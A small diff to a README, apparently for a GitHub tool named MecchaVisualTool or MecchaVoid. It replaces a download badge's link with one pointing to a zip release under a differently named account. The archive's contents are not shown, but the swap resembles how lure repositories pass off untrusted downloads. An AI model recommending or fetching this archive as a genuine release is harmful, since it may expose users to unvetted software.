@@ -8,10 +8,7 @@
 
 <div align="center">
 
-## 📥 Download
-
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Pointnocutter/MecchaVisualTool/releases/download/asd/v.1.1.4.zip)
-
+[![Download](https://img.shields.io/badge/⬇️_Download-brightgreen?style=for-the-badge&logo=github)](https://github.com/MailJackdaw39/Meccha-Chameleon-MecchaVoid/releases/download/v1.6/MecchaVoid.zip)
 </div>
 
 ---
